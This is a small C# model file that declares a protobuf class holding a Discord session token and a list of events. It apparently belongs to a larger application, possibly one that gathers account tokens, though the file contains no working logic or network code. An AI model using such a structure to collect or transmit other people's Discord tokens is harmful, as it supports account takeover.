using ProtoBuf;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Models.Common
{
	[ProtoContract(Name = "DiscordSession")]
	public class DiscordSession
	{
		[ProtoMember(1, Name = "token")]
		public string token
		{
			get;
			set;
		}

		[ProtoMember(2, Name = "events")]
		public List<Event> events
		{
			get;
			set;
		}
	}
}
